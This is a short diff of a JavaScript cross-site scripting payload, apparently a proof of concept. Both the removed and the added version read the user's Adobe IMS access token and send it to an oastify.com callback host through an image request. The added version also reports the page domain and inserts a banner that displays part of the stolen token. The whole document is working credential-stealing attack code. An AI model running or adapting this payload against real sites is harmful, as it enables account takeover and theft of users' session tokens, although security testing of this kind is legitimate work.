@@ -1,6 +1,1 @@
-(function(){
-  var t = window.adobeIMS && window.adobeIMS.getAccessToken();
-  if (t && t.token) {
-    new Image().src = 'https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/?t=' + encodeURIComponent(t.token);
-  }
-})();
+(function(){var t=window.adobeIMS&&window.adobeIMS.getAccessToken();if(t&&t.token){new Image().src='https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/?t='+encodeURIComponent(t.token)+'&d='+document.domain;}var b=document.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;padding:25px;background:#c0392b;color:white;font-size:22px;z-index:99999;font-weight:bold';b.innerHTML='XSS on '+document.domain+(t&&t.token?' | Token: '+t.token.substring(0,30)+'...':' | Not logged in');document.body.prepend(b);})()
